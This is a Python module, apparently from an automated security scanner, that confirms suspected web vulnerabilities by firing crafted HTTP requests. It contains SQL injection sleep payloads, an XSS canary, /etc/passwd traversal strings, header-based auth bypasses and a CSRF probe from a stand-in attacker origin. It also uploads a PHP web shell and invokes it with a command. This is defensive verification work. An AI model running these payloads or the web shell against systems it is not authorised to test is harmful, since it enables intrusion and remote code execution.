"""
HttpVerifier — HTTP-level vulnerability verification using native Python requests.

Each strategy directly sends crafted HTTP payloads through the HttpAdapter
and analyzes the response. If a strategy returns INCONCLUSIVE, it allows the
main Verifier to escalate the finding to the LLM Docker sandbox.
"""
import asyncio
import logging
import os
import uuid
from typing import Optional
from urllib.parse import urljoin

from ..models import StaticFinding, VerifiedVuln, ConfirmedStatus, FindingSeverity
from ..adapters.http_adapter import HttpAdapter

logger = logging.getLogger(__name__)

# SQLi time-based threshold (seconds)
TIMING_THRESHOLD_SEC = 4.5

_SQLI_PAYLOADS = [
    "' OR SLEEP({sec})-- -",
    "1 OR SLEEP({sec})-- -",
    "') OR SLEEP({sec})-- -",
    "1; WAITFOR DELAY '0:0:{sec}'-- -",
    "1 OR pg_sleep({sec})-- -",
]

_XSS_CANARY = "zk_xss_canary_<script>alert(1)</script>"
_XSS_ENCODED = "zk_xss_canary_%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2F%2F%2F%2F%2Fetc%2Fpasswd",
]


class HttpVerifier:
    def __init__(self, adapter: Optional[HttpAdapter] = None):
        self.adapter = adapter or HttpAdapter()

        self._strategies = {
            89:  self._verify_sqli_time_based,
            79:  self._verify_xss_reflected,
            22:  self._verify_path_traversal,
            434: self._verify_file_upload,
            352: self._verify_csrf,
            862: self._verify_missing_authz,
            287: self._verify_auth_bypass,
            # SSRF (918) and IDOR (639) are intentionally left out
            # They will return INCONCLUSIVE and escalate to LLM.
        }

    async def verify(
        self,
        finding: StaticFinding,
        target_url: str,
    ) -> VerifiedVuln:
        cwe_id = self._extract_cwe_id(finding)
        strategy = self._strategies.get(cwe_id)

        if not strategy:
            logger.info(f"[HttpVerifier] No native strategy for CWE-{cwe_id}, escalating to LLM.")
            return self._make_vuln(finding, ConfirmedStatus.INCONCLUSIVE, "No native strategy")

        logger.info(f"[HttpVerifier] Verifying {finding.id} (CWE-{cwe_id}) at {target_url}")

        try:
            confirmed, evidence, req_raw, resp_raw = await strategy(finding, target_url)

            status = ConfirmedStatus.CONFIRMED if confirmed else ConfirmedStatus.REJECTED
            return self._make_vuln(
                finding, status, evidence,
                request_raw=req_raw, response_raw=resp_raw,
            )

        except Exception as e:
            logger.error(f"[HttpVerifier] Strategy failed for {finding.id}: {e}")
            return self._make_vuln(finding, ConfirmedStatus.INCONCLUSIVE, f"Error: {e}")

    # --- Strategies ---

    async def _verify_sqli_time_based(self, finding, url: str) -> tuple:
        for payload_tpl in _SQLI_PAYLOADS:
            payload = payload_tpl.format(sec=5)
            for method, body, params in [
                ("GET", None, {"id": payload}),
                ("POST", {"id": payload}, None)
            ]:
                resp, curl_log = self.adapter.send_request(method, url, params=params, data=body)
                if getattr(resp, 'elapsed', None) and resp.elapsed.total_seconds() > TIMING_THRESHOLD_SEC:
                    evidence = f"SQLi CONFIRMED: delay > {TIMING_THRESHOLD_SEC}s\nCommand: {curl_log}"
                    return True, evidence, curl_log, getattr(resp, 'text', '')[:200]
        return False, "No SLEEP delay observed", "", ""

    async def _verify_xss_reflected(self, finding, url: str) -> tuple:
        for payload in (_XSS_CANARY, _XSS_ENCODED):
            resp, curl_log = self.adapter.send_request("GET", url, params={"q": payload, "search": payload})
            resp_text = getattr(resp, 'text', '')
            if _XSS_CANARY in resp_text or "<script>alert(1)</script>" in resp_text:
                evidence = f"XSS CONFIRMED: payload reflected unescaped\nCommand: {curl_log}"
                return True, evidence, curl_log, resp_text[:200]
        return False, "Payload not reflected", "", ""

    async def _verify_path_traversal(self, finding, url: str) -> tuple:
        for payload in _TRAVERSAL_PAYLOADS:
            for param in ("file", "path", "filename", "f", "name"):
                resp, curl_log = self.adapter.send_request("GET", url, params={param: payload})
                resp_text = getattr(resp, 'text', '')
                if "root:" in resp_text or "/bin/bash" in resp_text or "daemon:" in resp_text:
                    evidence = f"Path Traversal CONFIRMED\nCommand: {curl_log}"
                    return True, evidence, curl_log, resp_text[:200]
        return False, "No /etc/passwd content found", "", ""

    async def _verify_file_upload(self, finding, url: str) -> tuple:
        webshell = b"<?php echo shell_exec($_GET['cmd']); ?>"
        files = {'file': ('zk_test.php', webshell, 'application/octet-stream')}
        
        resp, curl_log = self.adapter.send_request("POST", url, files=files)
        if getattr(resp, 'status_code', 0) not in (200, 201, 302):
            return False, f"Upload rejected (HTTP {getattr(resp, 'status_code', 0)})", curl_log, getattr(resp, 'text', '')[:200]

        parsed_url = urljoin(url, "/")
        for access_path in ("uploads/zk_test.php?cmd=id", "files/zk_test.php?cmd=id"):
            access_url = urljoin(parsed_url, access_path)
            test_resp, test_curl = self.adapter.send_request("GET", access_url)
            test_resp_text = getattr(test_resp, 'text', '')
            if "uid=" in test_resp_text or "root" in test_resp_text:
                evidence = f"File Upload RCE CONFIRMED\nUpload Cmd: {curl_log}\nAccess Cmd: {test_curl}"
                return True, evidence, curl_log, test_resp_text[:200]
                
        return False, "Uploaded file not executable", curl_log, getattr(resp, 'text', '')[:200]

    async def _verify_csrf(self, finding, url: str) -> tuple:
        headers = {"Origin": "https://evil.example.com", "Referer": "https://evil.example.com/"}
        resp, curl_log = self.adapter.send_request("POST", url, headers=headers, data={"action":"delete"})
        if getattr(resp, 'status_code', 0) in (200, 204):
            evidence = f"CSRF CONFIRMED (No Token Validation via cross-origin)\nCommand: {curl_log}"
            return True, evidence, curl_log, getattr(resp, 'text', '')[:200]
        return False, f"Request rejected (HTTP {getattr(resp, 'status_code', 0)})", curl_log, getattr(resp, 'text', '')[:200]

    async def _verify_missing_authz(self, finding, url: str) -> tuple:
        resp, curl_log = self.adapter.send_request("GET", url)
        # Without auth tokens, a 200/201 on a protected route usually means authz is missing.
        if getattr(resp, 'status_code', 0) in (200, 201):
            evidence = f"Missing Auth CONFIRMED (HTTP {resp.status_code} on protected route)\nCommand: {curl_log}"
            return True, evidence, curl_log, getattr(resp, 'text', '')[:200]
        return False, f"Endpoint protected (HTTP {getattr(resp, 'status_code', 0)})", curl_log, getattr(resp, 'text', '')[:200]

    async def _verify_auth_bypass(self, finding, url: str) -> tuple:
        bypasses = [{"X-Forwarded-For": "127.0.0.1"}, {"X-Original-URL": "/admin"}]
        for bypass in bypasses:
            resp, curl_log = self.adapter.send_request("GET", url, headers=bypass)
            if getattr(resp, 'status_code', 0) in (200, 201):
                injected = list(bypass.keys())[0]
                evidence = f"Auth Bypass CONFIRMED (Header '{injected}' allowed access)\nCommand: {curl_log}"
                return True, evidence, curl_log, getattr(resp, 'text', '')[:200]
        return False, "No bypass succeeded", "", ""

    # --- Helpers ---
    @staticmethod
    def _extract_cwe_id(finding: StaticFinding) -> Optional[int]:
        if not finding.cwe_details: return None
        raw = finding.cwe_details.get("id")
        if not raw: return None
        try:
            return int(str(raw).replace("CWE-", "").replace("cwe-", "").strip())
        except ValueError:
            return None

    @staticmethod
    def _make_vuln(finding, status, evidence, request_raw="", response_raw="") -> VerifiedVuln:
        return VerifiedVuln(
            finding_id=finding.id, status=status,
            poc={"type": "http_curl", "request_raw": request_raw, "response_raw": response_raw},
            runtime_output=evidence, evidence=evidence,
            description=finding.description, cwe_details=finding.cwe_details
        )
